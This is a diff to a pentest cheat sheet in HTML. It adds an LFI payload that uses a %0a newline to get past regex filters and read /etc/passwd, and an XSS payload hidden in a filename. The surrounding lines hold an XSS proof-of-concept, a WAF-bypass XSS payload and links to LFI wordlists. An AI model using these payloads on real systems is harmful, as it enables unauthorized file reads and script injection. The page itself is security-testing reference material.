@@ -531,6 +531,8 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
     <h3 id='n2.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LFI Payloads </h3>
 	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux'> For Linux </a>
  	<li> <a href='https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows'> For Windows </a>
+	<li> %0a to bypass regex rules:
+		<pre><code>http://vuln.host/some.php?file=%0a../../../../etc/passwd</code></pre>
     <h3 id='n2.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS Payloads </h3>
 	    <li> <b> Proof Of Concept (PoC) </b> - <pre><code> <script>alert('Success XSS!');</script> </code></pre>
 	      <p> This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text "Success XSS".
@@ -544,6 +546,8 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 	      <p> An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
 	    <li> XSS Bypass WAF:
 		    <pre><code>&lt;details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//</code></pre>
+	    <li> Try to download to bypass shielding file with name like:
+		    <pre><code>&lt;img src=1 onerror=alert()>.png</code></pre>
 	    <li> Description of XSS payloads <a href='https://netsec.expert/posts/xss-in-2020/'>here</a>
 <h3 id='n2.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CSRF </h3>
 	<li> Temple for payload:
